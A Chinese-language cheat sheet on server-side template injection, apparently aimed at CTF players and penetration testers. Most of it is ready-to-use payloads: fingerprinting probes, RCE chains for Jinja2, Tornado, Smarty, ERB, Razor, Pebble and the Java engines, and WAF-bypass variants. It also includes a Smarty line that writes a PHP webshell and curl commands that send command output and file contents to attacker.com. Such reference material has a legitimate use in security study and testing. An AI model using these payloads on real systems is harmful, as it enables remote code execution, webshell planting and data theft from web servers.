# SSTI (Server-Side Template Injection)

服务器端模板注入（SSTI）发生在模板引擎不安全地将用户输入直接拼接进模板字符串中解析并执行时。这能允许攻击者在模板渲染引擎的上下文中执行任意代码，引发严重的 RCE。

---

## 1. 模板引擎指纹识别 (Fingerprinting)

在发起任何沙盒逃逸前，必须精确判断目标后端所采用的模板引擎。

```text
                           ${7*7}
                          /      \
                      {{7*7}}     a*b (不解析)
                     /      \          |
               a*b (不解析)  49        Smarty
                 /          /  \
             49 (Jinja2)  49    ${7*7}
                         /        |
                     Twig      Freemarker / Velocity
```

*   **测试 Payload 序列**：
    *   `${7*7}`：通常返回 `49` 说明是 Java/PHP/Ruby 模板引擎。
    *   `{{7*7}}`：通常返回 `49` 说明是 Python (Jinja2, Tornado) 或 PHP (Twig)。
    *   `<%= 7*7 %>`：说明是 Ruby (ERB) 或 ASP/JSP 经典标签。
    *   `*{7*7}`：说明是 Thymeleaf。

---

## 2. Python Jinja2 沙盒逃逸与利用链

Jinja2 拥有强大的 Python 反射机制。如果我们可以直接或间接访问 `__class__`，就能回溯到基类 `object` 并定位到 `os` 模块。

### A. 经典命令执行 (RCE) 利用链
*   **利用 `__subclasses__` 定位危害类**：
    我们可以通过遍历 `object.__subclasses__()` 查找引入了 `os` 模块的内置类（如 `sys` 或 `warnings`）。
    ```python
    # 通过查找 warnings.catch_warnings 类（通常在 subclasses 的前两百个内）
    {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
    ```
*   **利用 `__import__` 动态加载**：
    ```python
    {{ [].__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
    ```

### B. 绕过 WAF 过滤技巧

如果在 CTF 中遇到了输入长度限制或强力 WAF 过滤：

*   **绕过 `.`（点号）过滤**：
    使用 `[]` 中括号或 `attr` 过滤器替代点号：
    ```python
    {{ ''['__class__']['__mro__'][1] }}
    {{ ''|attr('__class__')|attr('__mro__') }}
    ```
*   **绕过双下划线 `__` 过滤**：
    使用十六进制编码（如 `\x5f\x5f` 代表 `__`），配合 `[]` 检索：
    ```python
    # 动态拼接字符串
    {{ ''['\x5f\x5fclass\x5f\x5f'] }}
    ```
*   **绕过引号 `'` / `"` 过滤**：
    *   利用 `request` 对象获取外部参数，将恶意字符串转移到 GET/POST/Cookie 字段中：
        `{{ ''['__class__']['__mro__'][1].__subclasses__()[132].__init__.__globals__[request.args.cmd](request.args.arg).read() }}`
        *请求时附加参数：`?cmd=popen&arg=cat+/flag`。*
    *   使用 `chr` 编码拼接：
        `{% set popen = (dict(p=1)|join~dict(o=1)|join~dict(p=1)|join~dict(e=1)|join~dict(n=1)|join) %}`
    *   利用内置 `lipsum` 或 `config` 关键字：
        `{{ lipsum.__globals__['os']['popen']('whoami').read() }}`

---

## 3. Java 模板引擎利用 (Thymeleaf / Velocity / FreeMarker)

Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：

*   **Thymeleaf 注入（常用于 Spring Boot 应用）**：
    在 Thymeleaf 渲染控制器的 URL 参数时触发：
    ```text
    __${T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com")}__::.x
    ```
*   **Velocity 注入**：
    ```text
    #set($str="")
    #set($class=$str.getClass())
    #set($cl=$class.forName("java.lang.Runtime"))
    #set($method=$cl.getMethod("getRuntime",null))
    #set($rt=$method.invoke(null,null))
    #set($exec=$cl.getMethod("exec",$class))
    #set($process=$exec.invoke($rt,"whoami"))
    ```
*   **FreeMarker 注入**：
    使用内置的 `freemarker.template.utility.Execute` 执行：
    ```text
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
    ```

---

---

## 4. 更多引擎利用

### Tornado (Python)

```python
# Tornado 模板引擎
{{ __import__('os').popen('whoami').read() }}
{{ handler.settings }}  # 泄露 tornado 配置 (含 cookie_secret)
{{ globals()['__builtins__']['__import__']('os').popen('id').read() }}
```

### Smarty (PHP)

```smarty
{system('whoami')}
{Smarty_Internal_Write_File::writeFile(['/var/www/shell.php','<?php system($_GET[c]);?>'])}
{php}system('whoami');{/php}
{include file='php://filter/convert.base64-encode/resource=/flag'}
```

### ERB (Ruby)

```erb
<%= system('whoami') %>
<%= `id` %>
<%= Dir.glob('/flag*') %>
<%= File.read('/flag') %>
```

### ASP.NET Razor

```razor
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{
    var p = System.Diagnostics.Process.Start("cmd.exe","/c whoami");
    p.WaitForExit();
}
```

### Pebble (Java)

```pebble
{% set cmd = 'whoami' %}
{{ cmd|e }}
{% for i in (1..1) %}{{ (new java.util.Scanner(new java.lang.ProcessBuilder('whoami').start().getInputStream())).useDelimiter('\\A').next() }}{% endfor %}
```

---

## 5. Jinja2 增强绕过

```python
# 如果 __class__ / __mro__ / __subclasses__ 被封:

# 绕过 1: 通过 request 对象
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}

# 绕过 2: 通过 lipsum
{{ lipsum.__globals__['os'].popen('whoami').read() }}

# 绕过 3: 通过 cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 绕过 4: 通过 namespace
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 绕过 5: 无括号 (利用 filter)
# {{ ()|attr('__class__')|attr('__base__')|... }}

# 绕过 6: 通过 URL For
{{ url_for.__globals__['os'].popen('whoami').read() }}

# 绕过 7: 通过 get_flashed_messages
{{ get_flashed_messages.__globals__['os'].popen('id').read() }}

# 绕过 8: 利用 config 对象
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 绕过 9: 字符串拼接构造关键字
{{ ''.__class__.__base__.__subclasses__()[(((1+1+1+1+1+1+1+1+1+1+1+1)*10)+12)] | attr('__init__') | attr('__globals__') | attr('__getitem__')('os') | attr('popen')('id') | attr('read')() }}

# 绕过 10: 利用 Unicode 混淆
{{ ()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") }}
```

### 无回显 OOB

```python
# DNS OOB
{{ lipsum.__globals__['os'].popen('curl $(whoami).attacker.com').read() }}

# HTTP OOB
{{ config.__class__.__init__.__globals__['os'].popen('curl -d "$(cat /flag)" http://attacker.com/r').read() }}
```

---

## 6. 工具链

```bash
# tplmap — SSTI 自动探测
python2 tplmap.py -u "https://target.com/page?name=test"

# SSTImap — Python3 版
python3 sstimap.py -u "https://target.com/page?name=test"

# 手动 fuzzing
for payload in '{{7*7}}' '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}'; do
  curl -s "https://target.com/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done
```

## 7. 攻击链

```
SSTI → Python subprocess.Popen → RCE → flag 读取
SSTI → config 泄露 → SECRET_KEY → Flask session 伪造 → Admin
SSTI → 文件读取 → 源码泄露 → 发现硬编码密码 → DB/内网
SSTI → 内网探测 → SSRF → 内部 API 访问
SSTI → lipsum globals → os.popen → reverse shell
SSTI → Jinja2 → Python 反射链 → import socket → 内网隧道
SSTI → Thymeleaf → Runtime.exec → RCE → Spring Actuator
SSTI → WAF bypass → request.args 外带 → 盲注式外带 flag
```

---

## Evidence

记录: 算数验证、引擎类型、最终链地址 (如 `__subclasses__()[132]` 的 index)、成功执行结果、绕过手法

